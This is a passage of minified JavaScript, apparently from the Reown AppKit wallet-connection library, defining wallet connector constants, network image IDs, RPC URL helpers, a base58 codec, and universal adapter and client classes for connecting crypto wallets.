WuiTooltip(){return ag},get WuiTransactionListItem(){return Ma},get WuiTransactionListItemLoader(){return b7},get WuiTransactionVisual(){return Md},get WuiVisual(){return Bw},get WuiVisualThumbnail(){return cg},get WuiWalletButton(){return cl},get WuiWalletImage(){return Rd},customElement:me,initializeTheming:fee,setColorTheme:$R,setThemeVariables:pee,swapInputMaskBottomSvg:sNe,swapInputMaskTopSvg:oNe},Symbol.toStringTag,{value:"Module"})),xn={METMASK_CONNECTOR_NAME:"MetaMask",TRUST_CONNECTOR_NAME:"Trust Wallet",SOLFLARE_CONNECTOR_NAME:"Solflare",PHANTOM_CONNECTOR_NAME:"Phantom",COIN98_CONNECTOR_NAME:"Coin98",MAGIC_EDEN_CONNECTOR_NAME:"Magic Eden",BACKPACK_CONNECTOR_NAME:"Backpack",BITGET_CONNECTOR_NAME:"Bitget Wallet",FRONTIER_CONNECTOR_NAME:"Frontier",XVERSE_CONNECTOR_NAME:"Xverse Wallet",LEATHER_CONNECTOR_NAME:"Leather",EIP155:"eip155",ADD_CHAIN_METHOD:"wallet_addEthereumChain",EIP6963_ANNOUNCE_EVENT:"eip6963:announceProvider",EIP6963_REQUEST_EVENT:"eip6963:requestProvider",CONNECTOR_RDNS_MAP:{coinbaseWallet:"com.coinbase.wallet",coinbaseWalletSDK:"com.coinbase.wallet"},CONNECTOR_TYPE_EXTERNAL:"EXTERNAL",CONNECTOR_TYPE_WALLET_CONNECT:"WALLET_CONNECT",CONNECTOR_TYPE_INJECTED:"INJECTED",CONNECTOR_TYPE_ANNOUNCED:"ANNOUNCED",CONNECTOR_TYPE_AUTH:"AUTH",CONNECTOR_TYPE_MULTI_CHAIN:"MULTI_CHAIN",CONNECTOR_TYPE_W3M_AUTH:"ID_AUTH"},hd={ConnectorExplorerIds:{[Me.CONNECTOR_ID.COINBASE]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[Me.CONNECTOR_ID.COINBASE_SDK]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[Me.CONNECTOR_ID.SAFE]:"225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",[Me.CONNECTOR_ID.LEDGER]:"19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927",[Me.CONNECTOR_ID.OKX]:"971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709",[xn.METMASK_CONNECTOR_NAME]:"c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",[xn.TRUST_CONNECTOR_NAME]:"4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",[xn.SOLFLARE_CONNECTOR_NAME]:"1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",[xn.PHANTOM_CONNECTOR_NAME]:"a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",[xn.COIN98_CONNECTOR_NAME]:"2a3c89040ac3b723a1972a33a125b1db11e258a6975d3a61252cd64e6ea5ea01",[xn.MAGIC_EDEN_CONNECTOR_NAME]:"8b830a2b724a9c3fbab63af6f55ed29c9dfa8a55e732dc88c80a196a2ba136c6",[xn.BACKPACK_CONNECTOR_NAME]:"2bd8c14e035c2d48f184aaa168559e86b0e3433228d3c4075900a221785019b0",[xn.BITGET_CONNECTOR_NAME]:"38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662",[xn.FRONTIER_CONNECTOR_NAME]:"85db431492aa2e8672e93f4ea7acf10c88b97b867b0d373107af63dc4880f041",[xn.XVERSE_CONNECTOR_NAME]:"2a87d74ae02e10bdd1f51f7ce6c4e1cc53cd5f2c0b6b5ad0d7b3007d2b13de7b",[xn.LEATHER_CONNECTOR_NAME]:"483afe1df1df63daf313109971ff3ef8356ddf1cc4e45877d205eee0b7893a13"},NetworkImageIds:{1:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",42161:"3bff954d-5cb0-47a0-9a23-d20192e74600",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",5e3:"e86fae9b-b770-4eea-e520-150e12c81100",295:"6a97d510-cac8-4e58-c7ce-e8681b044c00",11155111:"e909ea0a-f92a-4512-c8fc-748044ea6800",84532:"a18a7ecd-e307-4360-4746-283182228e00",1301:"4eeea7ef-0014-4649-5d1d-07271a80f600",130:"2257980a-3463-48c6-cbac-a42d2a956e00",10143:"0a728e83-bacb-46db-7844-948f05434900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100",2020:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",2021:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00","5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp":"a1b58899-f671-4276-6a5e-56ca5bd59700","4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z":"a1b58899-f671-4276-6a5e-56ca5bd59700",EtWTRABZaYq6iMfeYKouRu166VU2xqa1:"a1b58899-f671-4276-6a5e-56ca5bd59700","000000000019d6689c085ae165831e93":"21c895fa-e105-4829-9434-378bb54fa600","000000000933ea01ad0ee984209779ba":"220bcb01-ba47-41d3-fe5b-e29bbc4a4b00"},ConnectorImageIds:{[Me.CONNECTOR_ID.COINBASE]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[Me.CONNECTOR_ID.COINBASE_SDK]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[Me.CONNECTOR_ID.SAFE]:"461db637-8616-43ce-035a-d89b8a1d5800",[Me.CONNECTOR_ID.LEDGER]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[Me.CONNECTOR_ID.WALLET_CONNECT]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[Me.CONNECTOR_ID.INJECTED]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[Me.CONNECTOR_ID.INJECTED]:"Browser Wallet",[Me.CONNECTOR_ID.WALLET_CONNECT]:"WalletConnect",[Me.CONNECTOR_ID.COINBASE]:"Coinbase",[Me.CONNECTOR_ID.COINBASE_SDK]:"Coinbase",[Me.CONNECTOR_ID.LEDGER]:"Ledger",[Me.CONNECTOR_ID.SAFE]:"Safe"},ConnectorTypesMap:{[Me.CONNECTOR_ID.INJECTED]:"INJECTED",[Me.CONNECTOR_ID.WALLET_CONNECT]:"WALLET_CONNECT",[Me.CONNECTOR_ID.EIP6963]:"ANNOUNCED",[Me.CONNECTOR_ID.AUTH]:"AUTH"}},Rq={getCaipTokens(r){if(!r)return;const e={};return Object.entries(r).forEach(([t,i])=>{e[`${xn.EIP155}:${t}`]=i}),e},isLowerCaseMatch(r,e){return r?.toLowerCase()===e?.toLowerCase()}},Tb={UniversalProviderErrors:{UNAUTHORIZED_DOMAIN_NOT_ALLOWED:{message:"Unauthorized: origin not allowed",alertErrorKey:"INVALID_APP_CONFIGURATION"},JWT_VALIDATION_ERROR:{message:"JWT validation error: JWT Token is not yet valid",alertErrorKey:"JWT_TOKEN_NOT_VALID"},INVALID_KEY:{message:"Unauthorized: invalid key",alertErrorKey:"INVALID_PROJECT_ID"}},ALERT_ERRORS:{SWITCH_NETWORK_NOT_FOUND:{shortMessage:"Network Not Found",longMessage:"Network not found - please make sure it is included in 'networks' array in createAppKit function"},INVALID_APP_CONFIGURATION:{shortMessage:"Invalid App Configuration",longMessage:()=>`Origin ${yOe()?window.origin:"unknown"} not found on Allowlist - update configuration on cloud.reown.com`},SOCIALS_TIMEOUT:{shortMessage:"Invalid App Configuration",longMessage:()=>"There was an issue loading the embedded wallet. Please verify that your domain is allowed at cloud.reown.com"},JWT_TOKEN_NOT_VALID:{shortMessage:"Session Expired",longMessage:"Invalid session found on UniversalProvider - please check your time settings and connect again"},INVALID_PROJECT_ID:{shortMessage:"Invalid App Configuration",longMessage:"Invalid Project ID - update configuration"},PROJECT_ID_NOT_CONFIGURED:{shortMessage:"Project ID Not Configured",longMessage:"Project ID Not Configured - update configuration on cloud.reown.com"}}};function yOe(){return typeof window<"u"}const xOe={createLogger(r,e="error"){const t=ra({level:e}),{logger:i}=_3({opts:t});return i.error=(...n)=>{for(const s of n)if(s instanceof Error){r(s,...n);return}r(void 0,...n)},i}},COe="rpc.walletconnect.org";function EOe(r,e){const t=new URL("https://rpc.walletconnect.org/v1/");return t.searchParams.set("chainId",r),t.searchParams.set("projectId",e),t.toString()}const Oq=["near:mainnet","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","eip155:1101","eip155:56","eip155:42161","eip155:7777777","eip155:59144","eip155:324","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1","eip155:5000","solana:4sgjmw1sunhzsxgspuhpqldx6wiyjntz","eip155:80084","eip155:5003","eip155:100","eip155:8453","eip155:42220","eip155:1313161555","eip155:17000","eip155:1","eip155:300","eip155:1313161554","eip155:1329","eip155:84532","eip155:421614","eip155:11155111","eip155:8217","eip155:43114","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","eip155:999999999","eip155:11155420","eip155:80002","eip155:97","eip155:43113","eip155:137","eip155:10","eip155:1301","bip122:000000000019d6689c085ae165831e93","bip122:000000000933ea01ad0ee984209779ba"],h9={extendRpcUrlWithProjectId(r,e){let t=!1;try{t=new URL(r).host===COe}catch{t=!1}if(t){const i=new URL(r);return i.searchParams.has("projectId")||i.searchParams.set("projectId",e),i.toString()}return r},isCaipNetwork(r){return"chainNamespace"in r&&"caipNetworkId"in r},getChainNamespace(r){return this.isCaipNetwork(r)?r.chainNamespace:Me.CHAIN.EVM},getCaipNetworkId(r){return this.isCaipNetwork(r)?r.caipNetworkId:`${Me.CHAIN.EVM}:${r.id}`},getDefaultRpcUrl(r,e,t){const i=r.rpcUrls?.default?.http?.[0];return Oq.includes(e)?EOe(e,t):i||""},extendCaipNetwork(r,{customNetworkImageUrls:e,projectId:t,customRpc:i}){const n=this.getCaipNetworkId(r),s=this.getChainNamespace(r),o=r?.rpcUrls?.chainDefault?.http?.[0];let a="";return i?a=r.rpcUrls.default.http?.[0]||"":a=this.getDefaultRpcUrl(r,n,t),{...r,chainNamespace:s,caipNetworkId:n,assets:{imageId:hd.NetworkImageIds[r.id],imageUrl:e?.[r.id]},rpcUrls:{...r.rpcUrls,default:{http:[a]},chainDefault:{http:[o||r.rpcUrls.default.http[0]||""]}}}},extendCaipNetworks(r,{customNetworkImageUrls:e,projectId:t,customRpcChainIds:i}){return r.map(n=>h9.extendCaipNetwork(n,{customNetworkImageUrls:e,projectId:t,customRpc:i?.includes(n.id)}))},getViemTransport(r){const e=r.rpcUrls.default.http?.[0];return Oq.includes(r.caipNetworkId)?Lk([y1(e,{fetchOptions:{headers:{"Content-Type":"text/plain"}}}),y1(e)]):y1(e)}};var y7;(function(r){r.Google="google",r.Github="github",r.Apple="apple",r.Facebook="facebook",r.X="x",r.Discord="discord",r.Farcaster="farcaster"})(y7||(y7={}));class P5{constructor(){}static getInstance({projectId:e,chainId:t,enableLogger:i,onTimeout:n}){return P5.instance||(P5.instance=new bme({projectId:e,chainId:t,enableLogger:i,onTimeout:n})),P5.instance}}const x7={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0},Mc=sr({providers:{...x7},providerIds:{...x7}}),Wi={state:Mc,subscribeKey(r,e){return ci(Mc,r,e)},subscribeProviders(r){return ai(Mc.providers,()=>r(Mc.providers))},setProvider(r,e){e&&(Mc.providers[r]=Ra(e))},getProvider(r){return Mc.providers[r]},setProviderId(r,e){e&&(Mc.providerIds[r]=e)},getProviderId(r){return Mc.providerIds[r]},reset(){Mc.providers={...x7},Mc.providerIds={...x7}},resetChain(r){Mc.providers[r]=void 0,Mc.providerIds[r]=void 0}};function _Oe(r){if(r.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let l=0;l<e.length;l++)e[l]=255;for(let l=0;l<r.length;l++){const u=r.charAt(l),d=u.charCodeAt(0);if(e[d]!==255)throw new TypeError(u+" is ambiguous");e[d]=l}const t=r.length,i=r.charAt(0),n=Math.log(t)/Math.log(256),s=Math.log(256)/Math.log(t);function o(l){if(l instanceof Uint8Array||(ArrayBuffer.isView(l)?l=new Uint8Array(l.buffer,l.byteOffset,l.byteLength):Array.isArray(l)&&(l=Uint8Array.from(l))),!(l instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(l.length===0)return"";let u=0,d=0,h=0;const f=l.length;for(;h!==f&&l[h]===0;)h++,u++;const p=(f-h)*s+1>>>0,g=new Uint8Array(p);for(;h!==f;){let x=l[h],S=0;for(let T=p-1;(x!==0||S<d)&&T!==-1;T--,S++)x+=256*g[T]>>>0,g[T]=x%t>>>0,x=x/t>>>0;if(x!==0)throw new Error("Non-zero carry");d=S,h++}let w=p-d;for(;w!==p&&g[w]===0;)w++;let m=i.repeat(u);for(;w<p;++w)m+=r.charAt(g[w]);return m}function a(l){if(typeof l!="string")throw new TypeError("Expected String");if(l.length===0)return new Uint8Array;let u=0,d=0,h=0;for(;l[u]===i;)d++,u++;const f=(l.length-u)*n+1>>>0,p=new Uint8Array(f);for(;u<l.length;){const x=l.charCodeAt(u);if(x>255)return;let S=e[x];if(S===255)return;let T=0;for(let k=f-1;(S!==0||T<h)&&k!==-1;k--,T++)S+=t*p[k]>>>0,p[k]=S%256>>>0,S=S/256>>>0;if(S!==0)throw new Error("Non-zero carry");h=T,u++}let g=f-h;for(;g!==f&&p[g]===0;)g++;const w=new Uint8Array(d+(f-g));let m=d;for(;g!==f;)w[m++]=p[g++];return w}function c(l){const u=a(l);if(u)return u;throw new Error("Non-base"+t+" character")}return{encode:o,decodeUnsafe:a,decode:c}}var SOe="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const Np=_Oe(SOe),Bf={ERROR_CODE_UNRECOGNIZED_CHAIN_ID:4902,ERROR_CODE_DEFAULT:5e3,ERROR_INVALID_CHAIN_ID:32603},KR={getMethodsByChainNamespace(r){switch(r){case"solana":return["solana_signMessage","solana_signTransaction","solana_requestAccounts","solana_getAccounts","solana_signAllTransactions","solana_signAndSendTransaction"];case"eip155":return["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_showCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"];case"bip122":return["sendTransfer","signMessage","signPsbt","getAccountAddresses"];default:return[]}},createNamespaces(r){return r.reduce((e,t)=>{const{id:i,chainNamespace:n,rpcUrls:s}=t,o=s.default.http[0],a=this.getMethodsByChainNamespace(n);e[n]||(e[n]={methods:a,events:["accountsChanged","chainChanged"],chains:[],rpcMap:{}});const c=`${n}:${i}`,l=e[n];switch(l.chains.push(c),c){case gD.caipNetworkId:l.chains.push(gD.deprecatedCaipNetworkId);break;case mD.caipNetworkId:l.chains.push(mD.deprecatedCaipNetworkId);break}return l?.rpcMap&&o&&(l.rpcMap[i]=o),e},{})},resolveReownName:async r=>{const e=await id.resolveName(r);return(Object.values(e?.addresses)||[])[0]?.address||!1},getChainsFromNamespaces(r={}){return Object.values(r).flatMap(e=>{const t=e.chains||[],i=e.accounts.map(n=>{const[s,o]=n.split(":");return`${s}:${o}`});return Array.from(new Set([...t,...i]))})},isSessionEventData(r){return typeof r=="object"&&r!==null&&"id"in r&&"topic"in r&&"params"in r&&typeof r.params=="object"&&r.params!==null&&"chainId"in r.params&&"event"in r.params&&typeof r.params.event=="object"&&r.params.event!==null}};let GR=class{constructor({provider:e,caipNetworks:t,namespace:i}){this.id=Me.CONNECTOR_ID.WALLET_CONNECT,this.name=hd.ConnectorNamesMap[Me.CONNECTOR_ID.WALLET_CONNECT],this.type="WALLET_CONNECT",this.imageId=hd.ConnectorImageIds[Me.CONNECTOR_ID.WALLET_CONNECT],this.caipNetworks=t,this.provider=e,this.chain=i}get chains(){return this.caipNetworks}async connectWalletConnect(){return await this.authenticate()||await this.provider.connect({optionalNamespaces:KR.createNamespaces(this.caipNetworks)}),{clientId:await this.provider.client.core.crypto.getClientId(),session:this.provider.session}}async disconnect(){await this.provider.disconnect()}async authenticate(){const e=this.chains.map(t=>t.caipNetworkId);return xd.universalProviderAuthenticate({universalProvider:this.provider,chains:e,methods:AOe})}};const AOe=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"];let Lee=class{constructor(e){this.availableConnectors=[],this.eventListeners=new Map,e&&this.construct(e)}construct(e){this.caipNetworks=e.networks,this.projectId=e.projectId,this.namespace=e.namespace}get connectors(){return this.availableConnectors}get networks(){return this.caipNetworks||[]}setAuthProvider(e){this.addConnector({id:Me.CONNECTOR_ID.AUTH,type:"AUTH",name:Me.CONNECTOR_NAMES.AUTH,provider:e,imageId:hd.ConnectorImageIds[Me.CONNECTOR_ID.AUTH],chain:this.namespace,chains:[]})}addConnector(...e){const t=new Set;this.availableConnectors=[...e,...this.availableConnectors].filter(i=>t.has(i.id)?!1:(t.add(i.id),!0)),this.emit("connectors",this.availableConnectors)}setStatus(e,t){Se.setStatus(e,t)}on(e,t){this.eventListeners.has(e)||this.eventListeners.set(e,new Set),this.eventListeners.get(e)?.add(t)}off(e,t){const i=this.eventListeners.get(e);i&&i.delete(t)}removeAllEventListeners(){this.eventListeners.forEach(e=>{e.clear()})}emit(e,t){const i=this.eventListeners.get(e);i&&i.forEach(n=>n(t))}async connectWalletConnect(e){return{clientId:(await this.getWalletConnectConnector().connectWalletConnect()).clientId}}async switchNetwork(e){const{caipNetwork:t,providerType:i}=e;if(!e.provider)return;const n="provider"in e.provider?e.provider.provider:e.provider;if(i==="WALLET_CONNECT"){n.setDefaultChain(t.caipNetworkId);return}if(n&&i==="AUTH"){const s=n;await s.switchNetwork(t.caipNetworkId);const o=await s.getUser({chainId:t.caipNetworkId,preferredAccountType:Ne.state.defaultAccountTypes[t.chainNamespace]});this.emit("switchNetwork",o)}}getWalletConnectConnector(){const e=this.connectors.find(t=>t instanceof GR);if(!e)throw new Error("WalletConnectConnector not found");return e}},IOe=class extends Lee{setUniversalProvider(e){this.addConnector(new GR({provider:e,caipNetworks:this.caipNetworks||[],namespace:this.namespace}))}async connect(e){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:Number(e.chainId),provider:this.provider,address:""})}async disconnect(){try{await this.getWalletConnectConnector().disconnect()}catch(e){console.warn("UniversalAdapter:disconnect - error",e)}}async getAccounts({namespace:e}){const i=this.provider?.session?.namespaces?.[e]?.accounts?.map(n=>{const[,,s]=n.split(":");return s}).filter((n,s,o)=>o.indexOf(n)===s)||[];return Promise.resolve({accounts:i.map(n=>ke.createAccount(e,n,e==="bip122"?"payment":"eoa"))})}async syncConnectors(){return Promise.resolve()}async getBalance(e){if(!(e.caipNetwork&&kr.BALANCE_SUPPORTED_CHAINS.includes(e.caipNetwork?.chainNamespace))||e.caipNetwork?.testnet)return{balance:"0.00",symbol:e.caipNetwork?.nativeCurrency.symbol||""};if(Se.state.balanceLoading&&e.chainId===re.state.activeCaipNetwork?.id)return{balance:Se.state.balance||"0.00",symbol:Se.state.balanceSymbol||""};const n=(await Se.fetchTokenBalance()).find(s=>s.chainId===`${e.caipNetwork?.chainNamespace}:${e.chainId}`&&s.symbol===e.caipNetwork?.nativeCurrency.symbol);return{balance:n?.quantity.numeric||"0.00",symbol:n?.symbol||e.caipNetwork?.nativeCurrency.symbol||""}}async signMessage(e){const{provider:t,message:i,address:n}=e;if(!t)throw new Error("UniversalAdapter:signMessage - provider is undefined");let s="";return re.state.activeCaipNetwork?.chainNamespace===Me.CHAIN.SOLANA?s=(await t.request({method:"solana_signMessage",params:{message:Np.encode(new TextEncoder().encode(i)),pubkey:n}},re.state.activeCaipNetwork?.caipNetworkId)).signature:s=await t.request({method:"personal_sign",params:[i,n]},re.state.activeCaipNetwork?.caipNetworkId),{signature:s}}async estimateGas(){return Promise.resolve({gas:BigInt(0)})}async getProfile(){return Promise.resolve({profileImage:"",profileName:""})}async sendTransaction(){return Promise.resolve({hash:""})}walletGetAssets(e){return Promise.resolve({})}async writeContract(){return Promise.resolve({hash:""})}async getEnsAddress(){return Promise.resolve({address:!1})}parseUnits(){return 0n}formatUnits(){return"0"}async getCapabilities(){return Promise.resolve({})}async grantPermissions(){return Promise.resolve({})}async revokePermissions(){return Promise.resolve("0x")}async syncConnection(){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:1,provider:this.provider,address:""})}async switchNetwork(e){const{caipNetwork:t}=e,i=this.getWalletConnectConnector();if(t.chainNamespace===Me.CHAIN.EVM)try{await i.provider?.request({method:"wallet_switchEthereumChain",params:[{chainId:$i(t.id)}]})}catch(n){if(n.code===Bf.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||n.code===Bf.ERROR_INVALID_CHAIN_ID||n.code===Bf.ERROR_CODE_DEFAULT||n?.data?.originalError?.code===Bf.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)try{await i.provider?.request({method:"wallet_addEthereumChain",params:[{chainId:$i(t.id),rpcUrls:[t?.rpcUrls.chainDefault?.http],chainName:t.name,nativeCurrency:t.nativeCurrency,blockExplorerUrls:[t.blockExplorers?.default.url]}]})}catch{throw new Error("Chain is not supported")}}i.provider.setDefaultChain(t.caipNetworkId)}getWalletConnectProvider(){return this.connectors.find(i=>i.type==="WALLET_CONNECT")?.provider}},Bq=!1,TOe=class{constructor(e){this.chainNamespaces=[],this.initPromise=void 0,this.reportedAlertErrors={},this.setStatus=(t,i)=>{He.setConnectionStatus(t),Se.setStatus(t,i)},this.getIsConnectedState=()=>!!re.state.activeCaipAddress,this.setAllAccounts=(t,i)=>{Se.setAllAccounts(t,i),Ne.setHasMultipleAddresses(t?.length>1)},this.addAddressLabel=(t,i,n)=>{Se.addAddressLabel(t,i,n)},this.removeAddressLabel=(t,i)=>{Se.removeAddressLabel(t,i)},this.getCaipAddress=t=>re.state.activeChain===t||!t?re.state.activeCaipAddress:re.getAccountProp("caipAddress",t),this.getAddressByChainNamespace=t=>re.getAccountProp("address",t),this.getAddress=t=>re.state.activeChain===t||!t?Se.state.address:re.getAccountProp("address",t),this.getProvider=t=>Wi.getProvider(t),this.getProviderType=t=>Wi.state.providerIds[t],this.getPreferredAccountType=()=>Se.state.preferredAccountType,this.setCaipAddress=(t,i)=>{Se.setCaipAddress(t,i)},this.setBalance=(t,i,n)=>{Se.setBalance(t,i,n)},this.setProfileName=(t,i)=>{Se.setProfileName(t,i)},this.setProfileImage=(t,i)=>{Se.setProfileImage(t,i)},this.setUser=(t,i)=>{Se.setUser(t,i),Ne.state.enableEmbedded&&Ut.close()},this.resetAccount=t=>{Se.resetAccount(t)},this.setCaipNetwork=t=>{re.setActiveCaipNetwork(t)},this.getCaipNetwork=t=>t?re.getRequestedCaipNetworks(t).filter(i=>i.chainNamespace===t)?.[0]:re.state.activeCaipNetwork||this.defaultCaipNetwork,this.getCaipNetworkId=()=>{const t=this.getCaipNetwork();if(t)return t.id},this.getCaipNetworks=t=>re.getRequestedCaipNetworks(t),this.getActiveChainNamespace=()=>re.state.activeChain,this.setRequestedCaipNetworks=(t,i)=>{re.setRequestedCaipNetworks(t,i)},this.getApprovedCaipNetworkIds=()=>re.getAllApprovedCaipNetworkIds(),this.setApprovedCaipNetworksData=t=>re.setApprovedCaipNetworksData(t),this.resetNetwork=t=>{re.resetNetwork(t)},this.setConnectors=t=>{const i=[...Xe.getConnectors(),...t];Xe.setConnectors(i)},this.addConnector=t=>{Xe.addConnector(t)},this.getConnectors=()=>Xe.getConnectors(),this.resetWcConnection=()=>{ft.resetWcConnection()},this.fetchIdentity=t=>Lt.fetchIdentity(t),this.setAddressExplorerUrl=(t,i)=>{Se.setAddressExplorerUrl(t,i)},this.setSmartAccountDeployed=(t,i)=>{Se.setSmartAccountDeployed(t,i)},this.setConnectedWalletInfo=(t,i)=>{Se.setConnectedWalletInfo(t?{type:Wi.getProviderId(i),...t}:void 0,i)},this.setSmartAccountEnabledNetworks=(t,i)=>{re.setSmartAccountEnabledNetworks(t,i)},this.setPreferredAccountType=(t,i)=>{Se.setPreferredAccountType(t,i)},this.getReownName=t=>id.getNamesForAddress(t),this.setEIP6963Enabled=t=>{Ne.setEIP6963Enabled(t)},this.setClientId=t=>{Lt.setClientId(t)},this.getConnectorImage=t=>Nr.getConnectorImage(t),this.handleUnsafeRPCRequest=()=>{if(this.isOpen()){if(this.isTransactionStackEmpty())return;this.redirect("ApproveTransaction")}else this.open({view:"ApproveTransaction"})},this.options=e,this.version=e.sdkVersion,this.caipNetworks=this.extendCaipNetworks(e),this.chainNamespaces=[...new Set(this.caipNetworks?.map(t=>t.chainNamespace))],this.defaultCaipNetwork=this.extendDefaultCaipNetwork(e),this.chainAdapters=this.createAdapters(e.adapters),this.initialize(e),this.sendInitializeEvent(e)}static getInstance(){return this.instance}async initialize(e){this.initControllers(e),await this.initChainAdapters(),await this.injectModalUi(),await this.syncExistingConnection(),t0.set({initialized:!0})}sendInitializeEvent(e){const{...t}=e;delete t.adapters,Ve.sendEvent({type:"track",event:"INITIALIZE",properties:{...t,networks:e.networks.map(i=>i.id),siweConfig:{options:e.siweConfig?.options||{}}}})}async open(e){await this.injectModalUi(),e?.uri&&this.universalProvider&&ft.setUri(e.uri),e?.namespace&&Xe.setFilterByNamespace(e.namespace),await Ut.open(e)}async close(){await this.injectModalUi(),Ut.close()}setLoading(e){Ut.setLoading(e)}getError(){return""}getChainId(){return re.state.activeCaipNetwork?.id}async switchNetwork(e){const t=this.caipNetworks?.find(i=>i.id===e.id);if(!t){md.open(Tb.ALERT_ERRORS.SWITCH_NETWORK_NOT_FOUND,"error");return}await re.switchActiveNetwork(t)}getWalletProvider(){return re.state.activeChain?Wi.state.providers[re.state.activeChain]:null}getWalletProviderType(){return re.state.activeChain?Wi.state.providerIds[re.state.activeChain]:null}subscribeProviders(e){return Wi.subscribeProviders(e)}getThemeMode(){return Mi.state.themeMode}getThemeVariables(){return Mi.state.themeVariables}setThemeMode(e){Mi.setThemeMode(e),$R(Mi.state.themeMode)}setTermsConditionsUrl(e){Ne.setTermsConditionsUrl(e)}setPrivacyPolicyUrl(e){Ne.setPrivacyPolicyUrl(e)}setThemeVariables(e){Mi.setThemeVariables(e),pee(Mi.state.themeVariables)}subscribeTheme(e){return Mi.subscribe(e)}getWalletInfo(){return Se.state.connectedWalletInfo}subscribeAccount(e,t){function i(){const n=Xe.getAuthConnector(t),s=re.getAccountDataByChainNamespace(t);s&&e({allAccounts:s.allAccounts,caipAddress:s.caipAddress,address:ke.getPlainAddress(s.caipAddress),isConnected:!!s.caipAddress,status:s.status,embeddedWalletInfo:n?{user:s.user,authProvider:s.socialProvider||"email",accountType:s.preferredAccountType,isSmartAccountDeployed:!!s.smartAccountDeployed}:void 0})}t?re.subscribeChainProp("accountState",i,t):re.subscribe(i),Xe.subscribe(i)}subscribeNetwork(e){return re.subscribe(({activeCaipNetwork:t})=>{e({caipNetwork:t,chainId:t?.id,caipNetworkId:t?.caipNetworkId})})}subscribeWalletInfo(e){return Se.subscribeKey("connectedWalletInfo",e)}subscribeShouldUpdateToAddress(e){Se.subscribeKey("shouldUpdateToAddress",e)}subscribeCaipNetworkChange(e){re.subscribeKey("activeCaipNetwork",e)}getState(){return t0.state}subscribeState(e){return t0.subscribe(e)}showErrorMessage(e){vt.showError(e)}showSuccessMessage(e){vt.showSuccess(e)}getEvent(){return{...Ve.state}}subscribeEvents(e){return Ve.subscribe(e)}replace(e){Ee.replace(e)}redirect(e){Ee.push(e)}popTransactionStack(e){Ee.popTransactionStack(e)}isOpen(){return Ut.state.open}isTransactionStackEmpty(){return Ee.state.transactionStack.length===0}updateFeatures(e){Ne.setFeatures(e)}updateOptions(e){const i={...Ne.state||{},...e};Ne.setOptions(i)}setConnectMethodsOrder(e){Ne.setConnectMethodsOrder(e)}setWalletFeaturesOrder(e){Ne.setWalletFeaturesOrder(e)}setCollapseWallets(e){Ne.setCollapseWallets(e)}setSocialsOrder(e){Ne.setSocialsOrder(e)}async disconnect(){await ft.disconnect()}getConnectMethodsOrder(){return d0.getConnectOrderMethod(Ne.state.features,Xe.getConnectors())}removeAdapter(e){const 